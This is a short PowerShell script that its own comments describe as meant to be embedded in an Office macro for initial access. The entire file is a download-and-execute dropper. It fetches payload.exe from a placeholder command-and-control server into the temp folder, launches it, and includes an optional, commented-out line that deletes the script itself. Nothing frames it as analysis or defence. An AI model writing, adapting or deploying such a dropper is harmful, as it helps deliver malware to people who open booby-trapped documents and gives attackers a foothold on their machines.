# PowerShell script to be embedded in an Office macro for initial access.
# This script downloads and executes a payload from a remote server.

$url = "http://your-c2-server.com/payload.exe"
$output = "$env:TEMP\payload.exe"

# Download the payload
(New-Object System.Net.WebClient).DownloadFile($url, $output)

# Execute the payload
Start-Process -FilePath $output

# Self-destruct (optional)
# Remove-Item -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
